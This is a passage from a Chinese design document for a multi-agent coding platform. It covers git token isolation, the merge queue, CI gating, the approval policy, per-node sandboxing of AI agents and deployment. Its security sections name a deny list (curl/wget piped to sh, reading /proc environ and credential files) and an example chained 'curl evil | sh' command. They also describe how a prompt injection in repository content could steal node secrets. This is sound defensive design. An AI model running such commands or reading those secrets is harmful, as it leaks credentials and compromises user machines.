- **令牌只在守护进程自己的镜像里用**：共享克隆的 `.git` 员工可写（提交要落在那里），其中的 `remote.origin.url`、`url.*.insteadOf`、`http.proxy`、`core.fsmonitor`、过滤器等配置都不可信。所以守护进程为每个仓库在 `state/mirrors/<owner>__<repo>.git`（0700，员工不可读写）维护一个裸镜像：带令牌的 fetch 和 push 只在镜像里做（推送时先把 worktree 的 HEAD 取进镜像，再从镜像推固定 refspec 到固定 URL），共享克隆只从镜像本地 fetch，环境里没有令牌；守护进程在共享克隆和 worktree 里跑的所有 git 命令都用 `-c` 覆盖 `core.fsmonitor`、`core.hooksPath` 并清空已配置的过滤器驱动，环境里剔除 `AGENT_TEAMS_*`。
- **纵深防护**：守护进程把共享克隆及其所有 worktree 的 `core.hooksPath` 设为平台目录（员工不可写，§10.3）里的 `pre-push` 钩子，拒绝推送 `protected_refs` 和任何非本员工分支，并提示“请用 push_branch 工具”（钩子可被 `--no-verify` 绕过，但员工本来就没有写令牌，这一层只是给出清楚的报错）。`ci/detect` 同时建议用户在仓库建一个规则集：保护基准分支和 `thread/*`（GitHub 规则集的 `*` 不跨 `/`，因此不覆盖 `thread/<no>/<name>` 成员分支），限制更新与强推，绕过者只设平台 App。
- **workflow 文件**：写令牌不带 `workflows` 权限，GitHub 会拒绝任何改了 `.github/workflows/**` 的推送，所以员工写的 workflow 不可能在 `mq/**`、`thread/**` 的 push 上带着仓库 Actions secrets 运行。需要改 CI 的任务，平台在推送被拒时告诉员工“workflow 变更请写进交付说明，由用户合并”；项目设置里的“允许员工修改 workflow”开关（默认关，打开要二次确认并审计）会让推送作业的令牌带上 `workflows: write`。

### 8.2 合并队列（成员分支 → 讨论串分支，全部在 GitHub 上做，不占节点）

每个讨论串一条队列（`at_merge_queue`），一次处理一个条目：

1. 条目进入（组长 `enqueue_merge`，或审查/决策关卡通过后自动进入）。任务状态 `merging`。
2. 建试合并分支：`mq/<no>/<entry_id>` = 讨论串分支当前 head（`POST /git/refs`），然后 `POST /repos/{o}/{r}/merges {base: mq/…, head: thread/<no>/<name>}`。
   - 409 冲突 → 条目 `conflict`，给该成员生成修复任务“把 thread/<no>-<slug> rebase/merge 进你的分支并解决冲突”（`kind: fix`，直接点名该成员），任务回到 `running`。
3. 等 CI（§8.3）在试合并分支 head 上的结果。
4. 绿 → 快进讨论串分支：`PATCH /git/refs/heads/thread/<no>-<slug> {sha, force:false}`。如果讨论串 head 在此期间变了（422 非快进），回到第 2 步重建（最多 3 次）。
5. 红 → 条目 `ci_failed`，按失败的 check 生成修复任务回池（`kind: fix`，role = 原任务岗位，优先该成员），附上失败 check 的名称、摘要和日志链接（Checks API `output.summary`）。
6. 结束删除 `mq/*` 分支；任务 `done`；主任务打勾判断；发 `merge.*` 事件（机房的“合并队列”面板）。

### 8.3 CI（GitHub Checks）

- 项目设置 `ci`: `{mode: off|checks, required: ["verify", "integration"], appear_timeout_s: 300, timeout_s: 3600}`。`required` 为空 = 所有 check 都要通过。
- 结果来源：**轮询**为基线（`GET /repos/{o}/{r}/commits/{sha}/check-runs`，带 ETag，15 s 一次，只对等待中的 sha），**webhook** 为加速（配置了才用）。
- 试合并分支上要有 CI 跑：workflows 需要 `on: push` 覆盖 `mq/**` 和 `thread/**`。项目设置页检测不到时提示，并提供“帮我开一个 PR 加上触发条件”的按钮（由平台生成一个修改 workflow 的 PR，用户自己合）。
- `appear_timeout_s` 内没有任何 check 出现 → 视为“该仓库没有 CI”，按设置 `on_missing: pass|block` 处理（默认 pass 并在面板标“无 CI”）。
- **权限**：v1 的 App manifest 只有 `contents: write, pull_requests: write, workflows: write, metadata: read`。读 Checks 需要 `checks: read`（以及 `statuses: read` 兼容老式 status）。现有 App 要管理员在 GitHub 上加权限、每个安装方再批准一次（见 §15 风险 R4）。没批准时 CI 关卡自动降级为 `off` 并在讨论串里提示。新建 App 的 manifest 直接带上 `checks: read, statuses: read`，webhook 设为 active，事件 `check_suite, check_run, pull_request`。

### 8.4 PR 与验收

- 组长 `open_pr(title, body)` 或用户在 Thread 页点“开 PR”（`POST /api/threads/{tid}/open-pr`，标题和正文缺省时平台用讨论串标题 + 主任务清单 + 各小任务总结生成）：前提是该讨论串没有 `merging` 中的条目、所有主任务 done（否则返回错误说明还差什么；用户可带 `force: true` 跳过“主任务全部 done”这一条）。平台建 PR（head 讨论串分支 → base 项目基准分支），写 `at_threads.pr_*` 和一条 `pr` 类交付物，讨论串 → `review`，给统筹发 `[Thread #12 · … · review] <结论>`。
- **`require_acceptance` 开**（默认，设置页“讨论串完成后需要我验收”）：用户 `POST /api/threads/{id}/accept` → 平台等 PR head 上的必需 check 通过后合并 PR（`PUT /pulls/{n}/merge`，方法按 `delivery.merge_method` squash|merge|rebase，默认 squash），→ `done`。`reject {reason}` → 原因作为消息发给组长，→ `running`。
- **`require_acceptance` 关**（按设计稿：“PR 通过检查后自动合并进基准分支”）：讨论串进入 `review` 后，delivery 引擎轮询 PR head 的 check（与 §8.3 同一套规则：`required`、`appear_timeout_s`、`on_missing`），全部通过且 PR 可合并时用 `merge_method` 自动合并，→ `done` 并通知统筹；check 失败 → 给组长发 `[Thread #12 · CI 失败]`（附失败 check），讨论串回 `running`；合并冲突（基准分支前进）→ 给组长发修复指令，回 `running`。此时 accept 接口只是“立即合并（不等自动流程）”，reject 仍可用（在自动合并前拦下）。
- `done/archived` 后：所有会话 `session.close`，对涉及的节点发 `git.cleanup`（有未推送提交的 worktree 保留并回报），远端删除 `thread/<no>/*` 成员分支（讨论串分支随 PR 合并删除）。

## 9. 审批端到端

```
Claude 子进程                守护进程                      控制台                         网页
 │ 需要权限                    │                             │                              │
 ├─canUseTool(tool,input,opts)►│ approval_id = sha256(session│                              │
 │                             │   + toolUseID)              │                              │
 │                             ├─WS approval.request ───────►│ 写 at_questions(kind=approval)│
 │                             │                             │ 策略：角色跳过? 串内全放行?    │
 │                             │                             │ 记住的规则匹配? 只读白名单?   │
 │                             │◄── approval.resolve(allow) ─┤ ├─ 命中：直接回（记 decided_by）│
 │                             │                             │ └─ 未命中：SSE question ─────►│ 审批卡片
 │                             │                             │◄─ POST …/answer allow_always ─┤ 放行/总是允许/拒绝
 │                             │◄── approval.resolve ────────┤ 存规则(at_permission_rules)    │
 │◄─{behavior:'allow',         │                             │ 同员工同规则的其他待审批自动放行│
 │   updatedPermissions?}──────┤── approval.ack ────────────►│                              │
```

- **Claude**：`canUseTool` 返回的 Promise 一直挂着（SDK 说明无等待上限）。`allow_always` → 返回 `updatedPermissions = options.suggestions`（每条的 `destination` 一律改写为 `session`），同时控制台把这些 `PermissionUpdate` **原样**存进 `at_permission_rules.sdk_update`；以后同一员工（或规则范围内的员工）每次 `session.open`/resume，控制台把范围内的 `addRules`/`allow` 规则展开成 `claude.allowed_tools`（如 `Bash(pnpm add:*)`）下发，由 **Claude 自己的规则匹配器**判断（它正确处理 `&&`、`;`、`|`、`$()` 等复合命令和路径规则）。拒绝 → `{behavior:'deny', message:'用户拒绝了这个操作：<理由>'}`。`opts.signal` 中止（回合被打断 / 会话关闭）→ 守护进程发 `approval.cancel`，卡片变“已取消”。**绝不返回 `null`**（会让工具永远卡住）。
- **Codex**：`item/commandExecution/requestApproval`、`item/fileChange/requestApproval`、`item/permissions/requestApproval`、`mcpServer/elicitation/request` 都映射为同一种 `approval.request`（带 `kind` 和原始参数，fileChange 附 diff）。答复映射：allow → `accept`、allow_always → `acceptForSession`、deny → `decline`。收到 `serverRequest/resolved` → 视同 cancel。
- **策略顺序**（控制台 `approvals.Decide`）：⓪ **固定拒绝名单**（无论哪条策略都先过它，见 §10.3：读取或改动守护进程目录、`node.env`、凭证文件、其他项目目录，`curl|wget` 管道到 shell 等；命中直接 deny 并告警）→ ① 岗位 `skip_permissions`（这种会话本就以 bypass 模式开，正常不会来；来了直接放行并告警）→ ② 讨论串 `auto_approve`（“本讨论串内全部放行”，只在节点隔离级别满足 §10.3 时可开）→ ③ `at_permission_rules` 的**精确匹配**：同一工具且输入的规范化 hash 相同（`input_hash`），或该工具没有有意义的参数（例如某个平台外 MCP 工具整体放行）。**控制台不解析、不匹配 Claude 规则字符串**（`Bash(pnpm add:*)` 这类前缀规则只交给 Claude 本身，见上；用 Go 重写匹配器会放过 `pnpm add x && curl evil | sh`）→ ④ 项目级只读白名单（可选，同样只按工具名 + 精确输入）→ ⑤ 出卡片。
- **“本讨论串内全部放行”打开时**：控制台对该串所有 Claude 会话发 `session.set_mode {permission_mode:'acceptEdits'}`（文件编辑免问；其余仍走策略 ② 自动放行），并把当前所有待审批一次性放行（仍先过 ⓪）。关闭时改回 `default`。这样大部分请求在节点本地就不再往返。
- **断线**：守护进程重连后重发所有**仍挂着**的 `approval.request`（同 `approval_id` 幂等）；控制台重发所有已决定但未 `ack` 的 `approval.resolve`。
- **进程重启后的孤儿卡片**：`canUseTool` 的 Promise 和 app-server 的 JSON-RPC 请求随进程消失（守护进程重启、app-server 重启、会话崩溃后自动 resume）。守护进程重启时丢弃发件箱里对应 Promise 已不存在的 `approval.request`/`tool.call`，改发 `approval.cancel {reason:'process_restarted'}` / `tool.cancel`；控制台收到 `sessions.report` 或 `session.state crashed|parked|closed` 时，把该会话所有不在报告 `pending_approvals` 里的 open 审批标 `cancelled`（卡片显示“已失效，员工如仍需要会重新申请”）。阻塞型提问的调用死掉时提问**不取消**：用户之后的答复按非阻塞退路以 `session.send {kind:'answer'}` 送达（§6.3）。
- **超时**：默认不超时。项目设置可配 `approval_timeout`（例如 8 h），到期按 deny 处理并通知组长。

## 10. 安全模型

### 10.1 身份与令牌

| 令牌 | 形式 | 存储 | 生命周期 |
| --- | --- | --- | --- |
| 网页会话 | `token_urlsafe(32)` | 库里只存 sha256（`at_sessions`，与 v1 相同，v1 会话直接可用） | 30 天，v2 增加滑动续期（剩余 < 7 天时续）与每日清理 |
| 节点令牌 | 同上 | 库里只存 sha256（`at_nodes.token_hash`，v1 令牌直接可用）；节点上 `node.env` 0600 | 用户可轮换；轮换即断开 |
| 会话 MCP 秘密（仅 Codex 回环） | 守护进程随机生成，放在 URL 路径里 | 只在守护进程内存，只监听 127.0.0.1 | 到下一次 `thread/start`/`thread/resume` 为止（每次换新，§6.3） |
| GitHub 令牌 | App 安装令牌（1 h，**按仓库和权限缩小**，§10.4）或 PAT | 控制台：PAT 用 Fernet 密封入库；安装令牌只在内存 + Valkey（加密，TTL，缓存键含仓库与权限集） | 节点上**从不落盘**（§10.4） |

- 节点身份只由令牌决定（`?name=` 忽略，同 v1）。P7 加固：注册时守护进程生成 Ed25519 密钥对，之后用挑战签名认证，`node.env` 不再保存可重放的令牌（`at_nodes.public_key`）。
- 网页：SameSite=Lax 会话 cookie 保留（GitHub 回调需要）；v2 增加 CSRF 防护（GitHub 回调路径用签名 state，不受影响）。**分两段上线**，因为 v1 网页从不发 `X-CSRF-Token`，而 P1 起 Go 就在前门处理 v1 网页的写请求：
  - **P1–P5（v1 网页还在）**：cookie 认证的非 GET/HEAD 请求，带了 `X-CSRF-Token` 就必须等于 `agent_teams_csrf` cookie；没带时退回**同源检查**：`Sec-Fetch-Site` 为 `same-origin`（或缺省时 `Origin` 等于 `AGENT_TEAMS_PUBLIC_URL` 的 origin），否则 403。v2 新增的写接口（`/api/threads/*`、`/api/roles*`、`/api/admin/office/*` 等，v1 网页不会调用）和 `platform_version = 2` 用户的会话**始终要求令牌**（v2 网页一定带）。代理给 Python 的请求同样先过这道检查。
  - **P6 起**（v1 网页下线）：所有 cookie 认证的写请求都要求 `X-CSRF-Token`（双提交：`agent_teams_csrf` cookie + 头）。Bearer 认证的请求始终免 CSRF。
  - P1 契约测试覆盖：v1 网页录制的写请求（无令牌、同源头）通过；跨站 `Origin` 被拒；v2 路由无令牌被拒。
- 其余：登录/注册/节点创建限流（Valkey 令牌桶）、审计日志（`at_audit_log`：登录、角色变更、节点令牌、GitHub 连接、审批、验收、跳过确认开关）、修改密码、管理员重置密码（`atctl admin reset-password`）。

### 10.2 统筹不能碰代码（三道防线）

1. **会话配置**（守护进程）：`tools: []`、`disallowedTools` 覆盖全部文件/命令工具、`permissionMode:'dontAsk'`、`settingSources: []`、cwd 是空目录、不下发 git 凭证环境、不做 `git.prepare`。
2. **钩子**（守护进程）：PreToolUse 钩子对任何不是 `mcp__platform__*` 的调用返回 `permissionDecision:'deny'`，与模式无关（这也防 SDK 版本变化导致 `tools: []` 语义改变）。
3. **控制台核对**：守护进程在 `query()` 启动后立即 `await q.initializationResult()`（并查 `mcpServerStatus()`），把工具列表放进 `session.opened`；控制台按角色白名单比对，**通过之前不放行第一条消息**（`first_message` 由守护进程扣住，控制台核对通过后发 `session.release`），不符就 `session.close` 并标红告警。之后每个回合的 `system/init` 再核对一次。统筹的平台工具集里也没有任何能改代码的工具（它只能开讨论串、发话、问用户、记忆）。

**只读会话**（组长，以及 `read_only` 的岗位，如审查、决策）同样三道：

1. 会话配置：`disallowedTools: Edit, Write, NotebookEdit`；Claude Bash 沙箱开启且**没有任何可写路径**（§10.3），`allowUnsandboxedCommands: false`；文件工具（Read/Glob/Grep）由 PreToolUse 钩子限制在 cwd 和共享克隆的 `.git` 内。Codex 用 `sandbox: read-only`。
2. Bash 钩子按 **argv 解析**（不是正则）：只允许 `git log|diff|show|status|rev-parse|ls-files|blame|merge-base`、`git branch` 的列表形式（无位置参数，或只带 `--list`/`-a`/`-r`/`--contains <sha>`/`--merged`）、`gh pr view|diff|checks`；拒绝 `--output`/`-o`、`--ext-diff`、`--textconv`、`-c`、`--exec-path`、`--git-dir`/`--work-tree` 和任何 shell 元字符、重定向、管道、命令替换。
3. init 工具核对（同上）。

组长要看成员新推的分支：控制台在每条审查类消息（`[Task … done]`、`request_review`、合并队列结果）发给只读会话前，先对它的 worktree 发 `git.prepare {fetch: true}`（只 fetch，不改工作区）；只读会话自己的 Bash 不允许 `git fetch`。

### 10.3 守护进程本机边界

- 只在 `--root` 下创建目录和会话 cwd（与 v1 相同的路径约束）；`additionalDirectories` 一律不给。
- 只能起两类子进程：Agent SDK 内置的 `claude`、锁定版本的 `codex`；协议 1 兼容模式沿用 `--allow` 白名单。
- 控制台下发的命令全部按 Schema 校验，未知字段丢弃，未知类型回 `error{code:'unsupported'}`。

**员工看不到节点上的秘密。** 员工的 Bash、Codex 命令和文件工具如果与守护进程同一个 Unix 用户、同一个 HOME，就能读到 `node.env`（节点令牌）、`~/.claude/.credentials.json`、`$CODEX_HOME/auth.json`、守护进程 `state/`、`node.sock` 和别的会话的 `/proc/<pid>/environ`，一次来自仓库内容的提示注入就能偷走它们。v2 按节点的**隔离级别**处理（守护进程启动时探测，hello 上报 `isolation`，节点页显示）：

| 级别 | 做法 | 允许的功能 |
| --- | --- | --- |
| `agent_user`（推荐） | `install-node.sh --agent-user`（需要 sudo 一次）建一个无特权用户 `at-agent`。守护进程以自己的用户运行，`node.env`、`state/`、`node.sock` 的目录都是 0700 归守护进程用户；员工进程经一个只允许固定参数的 sudoers 规则（或 setuid 小助手）以 `at-agent` 身份启动，HOME = `<root>/agent-home/`，里面只有该运行时需要的登录（`.claude/.credentials.json`、`codex/auth.json`），worktree 目录组可写。员工能读到的只剩“自己所用运行时的登录” | 全部，包括“跳过权限确认”和“本讨论串内全部放行” |
| `sandbox` | 同一用户，但：Claude 会话开启 **Claude Code 的 Bash 沙箱**（`settings.sandbox.enabled = true`，`allowUnsandboxedCommands = false`，`filesystem.denyRead` = 守护进程配置目录、`state/`、`$XDG_RUNTIME_DIR/agent-teams`、其他项目目录、`~/.claude/.credentials.json`、`$CODEX_HOME`；可写路径只有 cwd 和共享克隆的 `.git`），并通过 `settings.permissions.deny` 给 Read/Edit 加同样的路径拒绝，PreToolUse 钩子再把文件工具限制在 cwd 内。员工专用 `HOME=<root>/agent-home/`（不含任何凭证）；Claude 登录通过 `CLAUDE_CONFIG_DIR` 指向守护进程目录，只有 claude 进程本身能读，沙箱里的命令读不到。`node.env`（`~/.config/agent-teams/`，0600）所在目录同样在 `denyRead` 和 Read 拒绝规则里 | Claude 员工除“跳过权限确认”外的全部功能（含“本讨论串内全部放行”）；**Codex 员工不派到这类节点**（Codex 沙箱只限写不限读，命令读凭证不需要审批，见 §15 R9） |
| `none` | 探测不到 bwrap/用户命名空间，也没有 `at-agent` | 不允许“跳过权限确认”和“本讨论串内全部放行”（开关在网页上置灰并说明原因）；审批策略 ⓪ 的固定拒绝名单始终生效；Codex 员工不派到这类节点 |

- 岗位的 `skip_permissions` 只派到 `agent_user` 级别或明确标记 `isolated`（整台机器/容器只给员工用、不放其他秘密）的节点；讨论串的 `auto_approve` 要求该串所有员工所在节点至少是 `sandbox` 级别。岗位保存和开关打开时都检查，不满足时报错说明。
- 固定拒绝名单（策略 ⓪，§9）：Read/Edit/Bash 涉及上述秘密路径；`curl|wget … | sh`；`git config` 改 `core.hooksPath`/`credential.*`；读 `/proc/*/environ`。名单写在控制台代码里，守护进程的 PreToolUse 钩子也用同一份名单先拦一道。
- 平台的 git 钩子目录（`core.hooksPath`，§8.1）和 gh 包装脚本放在员工不可写的目录。

### 10.4 GitHub 凭证不落盘

v1 在每次运行开始把 `GH_TOKEN` 放进环境。v2 会话是常驻的，安装令牌 1 小时就过期，所以改为**按需取**：

- 守护进程给每个会话设置 `GIT_CONFIG_COUNT/KEY/VALUE`：`credential.https://github.com.helper` 先清空，再设为 `!<node-bin> git-credential --session <sid>`；`GIT_TERMINAL_PROMPT=0`。
- `git-credential` 子命令通过守护进程的本地 unix socket（`$XDG_RUNTIME_DIR/agent-teams/cred.sock`，与守护进程主 socket 分开）请求凭证，请求里带会话打开时生成的每会话秘密（放在 `GIT_CONFIG_VALUE` 的 helper 参数里），守护进程再核对对端 uid（`SO_PEERCRED`）；守护进程向控制台发 `cred.request {session_id, host, repo}`，控制台核对节点归属（协议 §8）、该会话属于哪个项目、仓库是否匹配，返回**缩小过的**安装令牌（剩余 < 10 分钟就换新），守护进程内存缓存到过期前 5 分钟。
- **按仓库、按角色缩小令牌**：GitHub 允许铸造只针对指定仓库和部分权限的安装令牌（`POST /app/installations/{id}/access_tokens {repositories: [name], permissions: {...}}`）。员工会话拿到的令牌：成员和组长 `{contents: read, pull_requests: read, checks: read, metadata: read}`（能 fetch、`gh pr view/checks`，不能推送）；统筹不设 helper、拿不到任何令牌。写令牌只用于平台自己的作业：推送作业（§8.1，`{contents: write}`，项目允许时加 `workflows: write`）、控制台侧的合并队列/PR/合并（完整权限，只在控制台进程内）。PAT 连接无法缩小：使用 PAT 的项目在节点上只给推送作业使用 PAT，员工会话的 `cred.request` 一律拒绝（不能 fetch 私有仓库时由平台先 `git.prepare fetch`），项目设置页提示“建议改用 GitHub App 连接”。
- `gh`：会话 PATH 最前面放一个 `gh` 包装脚本（员工不可写目录），执行时同样取只读令牌后以 `GH_TOKEN=… exec <真实 gh>`；令牌只存在于那一次 gh 进程的环境里。

### 10.5 秘密与密钥

- `AGENT_TEAMS_SECRET_KEY` 沿用；Go 实现与 v1 相同的派生（`derive(label) = sha256("label:secret")`），OAuth state 签名格式完全一致，迁移期两边签发的 state 互认。
- 新增密钥轮换：`AGENT_TEAMS_SECRET_KEYS=new,old`（第一个加密，全部可解密）+ `atctl admin reseal` 重新加密全部密封值（v1 问题 14）。

## 11. 状态监控、事件落库与回放

### 11.1 事件分两类

| 表 | 内容 | 用途 |
| --- | --- | --- |
| `at_events` | 项目内所有“发生了什么”：消息、任务变化、提问/审批、留言、计划、交付物、合并/CI、讨论串状态、员工活动（工具开始/结束的摘要） | 项目 SSE、动态面板历史 |
| `at_status_events` | 员工状态变化：`{employee, tier, role, state, substate, bubble, task_id, task_kind, cause}` | 办公室实时与回放 |

**两张表共用一个按项目递增的序号 `seq`**：写事件的事务里先 `UPDATE at_projects SET event_seq = event_seq + 1 WHERE id = $1 RETURNING event_seq`，再插入事件行。行锁持有到提交，所以同一项目的事件**按 seq 顺序提交**，不会出现“小 id 晚提交、被已推送的大 id 跳过”的情况（IDENTITY 是插入时分配、不是提交时）。代价是同一项目的写事件事务串行化：写事件的事务都要短，事件插入放在事务最后一步。SSE 的 `id:` 就是 `seq`，续传时两张表按 `seq > last` 合并读取，一个游标同时覆盖两类事件。

两张表都按月分区（`PARTITION BY RANGE (created_at)`），`atctl` 每天建下月分区、按保留期删旧分区（默认 `at_events` 180 天、`at_status_events` 30 天）。

### 11.2 管线

```
SDK 消息 / hooks / Codex 通知
   │ 守护进程归一化（不判断状态，只描述事实）
   ▼
session.event {kind: turn_started|turn_ended|tool_started|tool_ended|thinking|text|
               compacting|rate_limited|error|subagent_started|subagent_stopped, tool?, category?, summary?}
   │ WS（seq + ACK，可重放）
   ▼
控制台 status 引擎 ◄── 任务板事件（claimed / done）、审批/提问（open / closed）、节点上下线、set_status
   │ 状态机（下表），去抖 800 ms（避免一次 Read 闪一下）
   ▼
at_status_events（落库） → at_employee_status（每员工最新一行，upsert） → Valkey PUBLISH project:<pid>
   ▼
SSE event: status → 网页办公室
```

守护进程侧的事实来源：Claude 用 `assistant` 的 `tool_use` 块 + `PreToolUse/PostToolUse/PostToolUseFailure` 钩子（工具开始/结束）、`Stop` 钩子和 `result` 消息（回合结束、费用、用量）、`system/status: compacting`、`rate_limit_event`、`api_retry`、`SubagentStart/Stop`；`system/init` 每回合一次，当作 turn_started。**不依赖** `session_state_changed`（实测没出现）。Codex 用 `turn/started|completed`、`item/started|completed`（`commandExecution`、`fileChange`、`mcpToolCall`、`agentMessage`）、`thread/status/changed`（`waitingOnApproval`）。

工具类别（守护进程打标签，控制台映射状态）：`Edit|Write|NotebookEdit|fileChange` → `edit`；`Read|Glob|Grep|WebFetch` → `read`；`Bash|commandExecution` → `shell`，并按命令识别子类 `test`（`pytest|go test|npm test|vitest|cargo test…`）、`git_commit`、`git_push`、`ci`（`gh run|gh pr checks`）、`install`；`mcp__platform__*` → `platform`。

### 11.3 状态机

优先级从高到低，第一个成立的决定状态：

| 状态 | 条件 |
| --- | --- |
| `offline` | 员工所在节点离线 |
| `broken` | 会话错误未恢复（`session.error`、认证失败、连续崩溃） |
| `raising_hand` | 该员工有 open 的审批或阻塞型提问（user 或 lead） |
| `queued` | 有消息或任务要处理，但节点活跃会话数已满，守护进程把它排在队里（`session.state queued`，办公室显示“排队等工位”） |
| `walking_to_board` → `claiming` → `returning` | `task.claimed` 之后的固定动画序列（时长由布局 JSON 的路径长度决定，控制台只发一次 `claimed`，动画在前端播放；状态表里记 `claiming`） |
| `typing` / `reading` / `running` | 最近一个 `tool_started` 的类别为 edit / read / shell（`running` 带子类：测试、提交、看 CI） |
| `thinking` | 回合进行中、没有工具在跑 |
| `waiting` | 有已领取任务但依赖未满足 / 在合并队列等 CI / 等审查 |
| `idle` | 无任务、无回合 |

`set_status(text, kind?)` 只改气泡文字（保留 10 分钟或到下一次 set_status / 任务变化），不改状态和位置。员工提示里要求“切换工作内容时调用 set_status，用一句中文描述在干什么”。没有 set_status 时气泡由平台生成（“改 PlanList.tsx”“跑 pytest”“领取 t8 …”）。

### 11.4 实时扇出与回放

- 写入顺序：先在事务里分配 `seq` 并写 `at_events`/`at_status_events`，提交后 `PUBLISH project:<pid> {seq, type}`（只带 seq 和小负载；大负载 SSE 层回表读）。SSE 层对每个连接记住已发出的最大 seq，Valkey 通知只当“有新事件”的提示，真正发送的是回表查到的 `seq > last` 的行，所以通知乱序或丢失都不影响。Valkey 断了不丢：SSE 连接重连时用 `Last-Event-ID`（= seq）从 PG 补。用户级事件流（`/api/events`）同理用 `at_users.event_seq`。
- 每条状态事件带 `tier`、`role`、`task_kind`（领取时从任务复制），回放旧任务时不需要回查任务表就能匹配布局规则的 `taskKind`。
- 回放：`GET /api/projects/{pid}/office/replay?from&to` 返回该时段开始时刻的状态快照（从 `at_status_events` 取每员工 `from` 之前最后一条）+ 时段内事件；前端按时间轴 1×/4×/16× 播放，复用实时渲染器。
- 节点命令跨副本：命令先写 `at_node_commands`，再 `PUBLISH node:<id>:cmd`；持有该节点链路的副本收到后发送。

## 12. 部署

### 12.1 compose 服务（同一台机器，沿用 PG17 + Valkey 9.1.2）

| 服务 | 镜像 | 说明 |
| --- | --- | --- |
| `control-plane` | `agent-teams-server:<ver>`（多阶段：`node:22-alpine` 构建 web → `golang:1.25` 构建 → `gcr.io/distroless/static:nonroot`） | `atctl serve`，端口绑定 `${BIND:-127.0.0.1}:${PORT}:${PORT}`，容器内也监听 `PORT`（与 v1 的 `agent-teams` 服务同一写法，对 Caddy）和内网 `:9090`（metrics）；启动前 `atctl migrate up`（单独的一次性服务 `migrate`，`depends_on: service_completed_successfully`）。distroless 里没有 shell 和 curl，健康检查用二进制自带的子命令：`healthcheck: {test: ["CMD", "/atctl", "healthcheck"], interval: 10s, timeout: 3s, retries: 6, start_period: 20s}`（`atctl healthcheck` 请求 `http://127.0.0.1:$PORT/healthz`，非 200 退出 1） |
| `migrate` | 同上镜像，`command: ["migrate","up"]` | 迁移只在这里跑，主服务不跑 DDL |
| `legacy` | 现有 `agent-teams:latest`（Python） | 迁移期保留，**不再对外暴露端口**，只在 compose 网络里给 control-plane 反代；P6 后删除 |
| `postgres` | `postgres:17-alpine` | 不变 |
| `valkey` | `valkey/valkey:9.1.2` | 不变 |

- 办公室布局：`./office:/srv/office:ro` 挂进 control-plane，`OFFICE_LAYOUT_DIR=/srv/office`，fsnotify 监听。
- 守护进程发布包：镜像内 `/srv/node-dist/agent-teams-node-<ver>.tgz`，由 `/node/dist/` 提供；`install-node.sh` 从控制台下载（不再从 GitHub 分支 pip 安装）。
- Caddy：沿用 `deploy/caddy.sh` 的写法 `reverse_proxy 127.0.0.1:PORT { flush_interval -1 }`。WebSocket（`/nodes/*`）Caddy 自动支持。v2 不需要额外路由规则：迁移期的分流在 control-plane 里做，不在 Caddy 里做（这样能按**用户**分流，规则见 §14.1）。
- `deploy/deploy.sh` v2：**保留 v1 的全部行为**（在 3001–3009 里挑空闲端口写进 `.env` 的 `PORT`，首次生成 `POSTGRES_PASSWORD`、`VALKEY_PASSWORD`、`AGENT_TEAMS_SECRET_KEY` 并且以后不再改，`--domain` 时设 `BIND=127.0.0.1` 和 https 的 `AGENT_TEAMS_PUBLIC_URL` 并调用 `deploy/caddy.sh`，`docker compose up -d --build`，轮询 `/healthz` 最多 60 s，打印“第一个注册的账号自动成为管理员”，失败时打印 control-plane 最近 50 行日志），新增：先 `docker compose run --rm migrate`（失败即停止，不启动新版本），迁移期在 `.env` 里写 `LEGACY_URL=http://legacy:${PORT}`（legacy 容器内仍按 `PORT` 监听，只是不再映射到宿主机）与 `LEGACY_INTERNAL_SECRET`（随机生成，见 §14.5）。

### 12.2 环境变量

沿用 `AGENT_TEAMS_PUBLIC_URL`、`DATABASE_URL`、`VALKEY_URL`、`AGENT_TEAMS_SECRET_KEY`（新增可选 `AGENT_TEAMS_SECRET_KEYS`）、`AGENT_TEAMS_ADMIN_EMAILS`、`PORT`；新增 `LEGACY_URL=http://legacy:${PORT}`、`LEGACY_INTERNAL_SECRET`（迁移期）、`OFFICE_LAYOUT_DIR`、`METRICS_ADDR=:9090`、`OTEL_EXPORTER_OTLP_ENDPOINT`（可选）、`GITHUB_WEBHOOK_SECRET`（可选）。v2 不再支持“没有 DATABASE_URL 就用内存”：没有 PG 直接拒绝启动（测试用 testcontainers）。

## 13. 可观测性

- **日志**：控制台 `slog` JSON，每条带 `request_id`、`user_id`、`project_id`、`thread_no`、`node_id`、`session_id`；守护进程 `pino` 同字段，关键日志（会话崩溃、认证失败、协议错误）也通过 `log` 消息回传控制台，存 `at_node_logs`（保留 7 天），节点页可看。
- **指标**（Prometheus）：HTTP 延迟/错误、SSE 连接数、节点在线数、WS 消息速率与 ACK 延迟、发件箱积压、活跃/停放会话数、回合时长、审批等待时长、任务池等待时长、合并队列时长、CI 结果、GitHub API 剩余额度、Agent SDK `rate_limit_event` 次数、按员工/项目的估算费用（`total_cost_usd`）和 token 用量。
- **成本**：`result` 里的费用和 usage 落 `at_usage`（按会话/回合），项目首页显示本讨论串估算花费（订阅账号下只是估算，界面写明）。
- **追踪**（可选）：OTel，HTTP → 引擎 → 节点命令用 `trace_id` 贯通（协议信封里带 `trace`）。
- **健康**：`/healthz`（进程活着）、`/readyz`（PG、Valkey 可用、迁移版本匹配）。

## 14. 分阶段交付与迁移（不停机）

> **决定（2026-11-14）：改为一次性切换。** 生产库目前只有 1 个用户、2 个节点、1 个项目，按用户逐个灰度、Go 反向代理 Python、Python 防护补丁和内部接口（§14.1 第 1、2、4、7、8 条，§14.5，§14.6 中与代理有关的步骤）的成本远大于收益，全部不做。做法：v2 在仓库里独立开发并在 rc 上用 docker compose 端到端测通 → 生产库副本上跑 `atctl migrate up`（原表原地扩展，见 data-model.md）并验证 → 生产停 Python、跑迁移、起 Go（同端口，Caddy 不改）→ 节点换 TS 守护进程（令牌不变）。保留 Python 镜像 `agent-teams:rollback-<sha>` 和迁移前的库状态用于回滚；v1 的旧对话在 v2 里只读呈现。下文保留原设计作参考，与本决定冲突处以本决定为准。

### 14.1 原则

1. **Go 做前门，Python 退到后面**：Caddy 只指向 Go；Go 没实现或该用户还在 v1 的请求，反向代理给 Python（HTTP、SSE、WebSocket 都用 `httputil.ReverseProxy`，SSE 设置 `FlushInterval: -1`）。
2. **分流规则（按顺序，第一条命中的生效）**：
